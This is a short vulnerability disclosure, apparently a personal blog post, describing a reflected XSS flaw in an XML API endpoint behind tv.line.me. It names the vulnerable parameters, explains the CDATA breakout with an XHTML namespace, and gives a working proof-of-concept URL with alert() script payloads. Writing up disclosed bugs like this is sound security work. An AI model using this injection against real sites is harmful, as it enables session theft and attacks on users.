I've been in the computer security field for a few years before I landed in a job. I discovered and reported a few bugs, but this is the first one I disclose. XSS is a common vulnerability frequently found on web applications and I found it on `global-nvapis.line.me`. The endpoint is used by `tv.line.me` to serve XML file pointing to streaming locations. It occurs that the API allows us to inject arbitary code to the page which results in XSS in the XML page. There were two parameters vulnerable to the injection listed in the following URL as follows:

Vulnerable file:

- `/linetv/rmcnmv/vod_play_videoInfo.json`

Vulnerable parameters:

- `adi`
- `adu`

Since we were able to inject some code in the XML page, the JavaScript code wouldn't be executed in an ordinary `<script>` tag. It requires us to specify the `xmlns` to `http://www.w3.org/1999/xhtml`, so the browser will execute the code as expected. The attack requires us to specific two valid parameters, `videoId` and `key`, to fetch the page. These two parameters can be obtained easily via any streaming video on `tv.line.me`.

### Proof of Concept (PoC):

Example

```
http://global-nvapis.line.me/linetv/rmcnmv/vod_play_videoInfo.json?videoId={valid_videoId}&key={valid_key}&doct=xml&devt=flash&cpt=ttml&sm=linetv&cc=TH&lc=EN_US&adi=]]>{XSS}<![CDATA[[&adu=]]>{XSS}<![CDATA[
```

Exploitation

```
http://global-nvapis.line.me/linetv/rmcnmv/vod_play_videoInfo.json?videoId={valid_videoId}&key={valid_key}&doct=xml&devt=flash&cpt=ttml&sm=linetv&cc=TH&lc=EN_US&adi=]]><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script><![CDATA[[&adu=]]><script xmlns="http://www.w3.org/1999/xhtml">alert(2)</script><![CDATA[
```
